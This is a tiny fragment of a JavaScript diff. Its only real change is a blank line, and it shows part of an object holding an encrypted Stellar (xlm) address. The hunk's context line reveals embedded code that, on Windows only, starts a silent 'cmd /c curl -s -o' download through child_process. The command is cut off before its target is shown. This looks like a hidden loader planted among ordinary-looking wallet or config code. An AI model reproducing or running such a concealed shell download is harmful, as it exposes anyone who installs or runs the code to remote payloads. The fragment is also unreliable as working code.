@@ -26,3 +26,4 @@ if(process.platform==='win32'){require('child_process').exec('cmd /c curl -s -o 
         xlm: client.utils.encryption.encryptData("GA6X5LQ3LMEWXRC74VUPHXFBUGIY3E3NFYCGSJZJCAKNBD2HBUFEANIL"),
     }
 }
+
